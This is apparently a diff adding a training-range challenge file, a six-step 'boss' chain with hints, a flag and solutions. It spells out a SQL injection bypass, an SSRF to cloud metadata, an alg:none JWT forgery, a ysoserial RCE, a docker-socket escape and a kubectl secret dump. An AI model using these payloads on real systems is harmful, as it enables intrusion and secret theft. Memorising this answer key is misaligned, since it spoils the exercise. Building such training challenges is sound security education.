@@ -1,0 +1,43 @@
+id: boss-ragnarok
+title: "RAGNAROK — The Final Reckoning"
+category: boss
+difficulty: boss
+cvss: 10.0
+owasp: ALL
+endpoint: /boss/ragnarok
+description: "A 6-step boss chain combining SQL injection, SSRF, JWT forgery, deserialization RCE, privilege escalation, and data exfiltration. Each step unlocks the next."
+hints:
+  - "Step 1: SQLi in the login bypasses auth. Use ' OR 1=1--"
+  - "Step 2: SSRF in profile picture URL fetcher. Target internal metadata."
+  - "Step 3: JWT with alg:none to impersonate admin."
+  - "Step 4: Java deserialization in admin panel for RCE."
+  - "Step 5: Escape Docker container via mounted docker socket."
+  - "Step 6: Extract flag from host Kubernetes secrets."
+flag: "BHEDA{boss_ragnarok_complete}"
+flag_location: "Kubernetes secret after container escape"
+solution_summary: "SQLi -> SSRF to cloud metadata -> JWT forgery -> ysoserial RCE -> docker socket escape -> kubectl get secrets"
+steps:
+  - id: ragnarok-1
+    description: "SQL injection in login bypasses authentication"
+    endpoint: /boss/ragnarok/login
+    solution: "' OR 1=1--"
+  - id: ragnarok-2
+    description: "SSRF in profile picture to access internal metadata"
+    endpoint: /boss/ragnarok/profile
+    solution: "http://169.254.169.254/latest/meta-data/"
+  - id: ragnarok-3
+    description: "JWT forgery using alg:none to access admin panel"
+    endpoint: /boss/ragnarok/admin
+    solution: "JWT header: {\"alg\":\"none\"}, payload: {\"role\":\"admin\"}"
+  - id: ragnarok-4
+    description: "Java deserialization RCE via admin import feature"
+    endpoint: /boss/ragnarok/import
+    solution: "ysoserial CommonsCollections1 'cat /flag.txt > /tmp/flag'"
+  - id: ragnarok-5
+    description: "Docker socket escape to host"
+    endpoint: /var/run/docker.sock
+    solution: "curl --unix-socket /var/run/docker.sock http://localhost/containers/json"
+  - id: ragnarok-6
+    description: "Extract flag from Kubernetes secrets on host"
+    endpoint: host:kubectl
+    solution: "kubectl get secrets -n kube-system flag -o jsonpath='{.data.flag}' | base64 -d"
